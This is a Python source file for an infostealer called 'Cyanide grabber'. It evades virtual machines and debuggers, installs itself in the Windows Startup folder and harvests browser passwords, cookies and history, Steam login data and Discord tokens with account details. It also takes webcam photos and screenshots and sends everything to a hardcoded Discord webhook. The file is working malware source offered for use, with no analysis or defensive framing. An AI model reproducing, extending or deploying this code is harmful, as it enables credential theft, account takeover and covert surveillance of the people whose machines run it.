import os
import vdf
import json
import nukelib

from core.componets import extractor
from core.componets import antivm
from core.componets import sysinfo
from core.componets import tokengrabber
from core.componets import screen

from threading import Thread
from discord_webhook import DiscordEmbed, DiscordWebhook

class Main:
    def __init__(self) -> None:
        self.webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1084889965940441269/0A7ZO1YHM3Ao3yaeH6cu0uqxe8mvwRsUOT5R1XRRiGpJUtGCL_jqZxmRu5u6zhpfImno', username="Cyanide", avatar_url="https://cdn.discordapp.com/attachments/1063218191259676702/1084916459647549540/Cyanide.png")
        self.camera = True
        self.screencom = screen.Screen()

    def camera(self):
        if self.camera:
            cameras = self.screencom.listCamera()
            camerasBytes = self.screencom.webcamSnap(cameras)
            for i, cameraBytes in enumerate(camerasBytes):
                self.webhook.add_file(cameraBytes, "webscreen."+i+".png")
        
        scrennshot = self.screencom.screenshot()
        self.webhook.add_file(scrennshot, "screenshot.png")

    def antivm(self):
        antivm.Antivm.run()
        antivm.Antidbg.proc_check()
        antivm.Antidbg.dll_check()

        antivm.Antidbg.process_check()

    def credsIntodict(self, creds: list):
        dataBuffer = {}
        for cell in creds:
            dataBuffer.update(cell)
        
        return json.dumps(dataBuffer, indent=3)

    def browser(self):
        creds = []
        for key in extractor.browsers_profile:
            browser = extractor.browsers_profile[key]

            if os.path.exists(browser):
                profiles = ["Default"]

                for file in os.listdir(browser):
                    if file.lower().startswith("profile"):
                        profiles.append(file)
                
                for profile in profiles:
                    extraction = extractor.Extract(os.path.join(browser, "Local State"))
                    passwds = extraction.extractPasswords(os.path.join(browser, profile, "Login Data"))
                    history = extraction.extractHistory(os.path.join(browser, profile, "History"))
                    cookies = extraction.extractCookies(os.path.join(browser, profile))

                    summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}

                    creds.append(summary)

        for key in extractor.browsers:
            browser = extractor.browsers[key]

            if os.path.exists(browser):
                extraction = extractor.Extract(os.path.join(browser, "Local State"))
                passwds = extraction.extractPasswords(os.path.join(browser, "Login Data"))
                history = extraction.extractHistory(os.path.join(browser, "History"))
                cookies = extraction.extractCookies(os.path.join(browser))

                summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}

                creds.append(summary)
        
        return creds
    
    def steam(self):
        steamUsers = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "config", "loginusers.vdf"))

        if os.path.exists(steamUsers):
            with open(steamUsers, "r") as f:
                usersConfig = vdf.loads(f.read())

            return usersConfig
        return "Nothing"
        
    def addStartup(self, linkname: str, pathExec: str):
        if not os.path.exists(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", linkname)):
            script = f"""
            $sh = New-Object -ComObject WScript.Shell
            $userStartupFolderPath = [Environment]::GetFolderPath("Startup")
            $shortcutFile = $sh.CreateShortcut("$userStartupFolderPath\{linkname}.lnk")
            $shortcutFile.TargetPath = "{pathExec}"
            $shortcutFile.Save()
            """
            sysinfo.runPowershell(script)


    def token(self):
        extractor.Anti_tokenprotector.killprotector()
        tokens = tokengrabber.extract_tokens().tokens
        
        return tokens

    def run(self):
        Thread(target=self.antivm).start()
        self.addStartup("MyApp", os.path.realpath(__file__))
        
        userConfig = self.steam()
        listCreds = self.browser()
        tokens = self.token()

        self.camera()

        for token in tokens:
            userinfo = nukelib.account_info(token)
            
            # icon url not work
            embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://cdn.discordapp.com/avatars/{userinfo['id']}/{userinfo['avatar']}", color="656166")
            embed.add_embed_field(name='Token', value=token)
            embed.add_embed_field(name='Locale', value=userinfo["locale"])
            embed.add_embed_field(name='Email', value=userinfo["email"])
            embed.add_embed_field(name='Phone', value=userinfo["phone"])
            embed.add_embed_field(name='Verified', value=str(userinfo["verified"]))
            embed.set_footer(text='By Cyanide grabber')

            embed.set_timestamp()

            self.webhook.add_embed(embed)

        embed = DiscordEmbed(title='Report', color="656166")
        embed.add_embed_field(name='Tokens', value=f"""```{tokens}```""")
        embed.set_footer(text='By Cyanide grabber')
        self.webhook.add_file(file=vdf.dumps(userConfig, True).encode(), filename="SteamConfig.txt")
        self.webhook.add_file(file=self.credsIntodict(listCreds).encode(), filename="Passwords.History.Cookies.txt")
        self.webhook.add_embed(embed)
        r = self.webhook.execute()

if __name__ == "__main__":
    Thread(target=Main().run).start()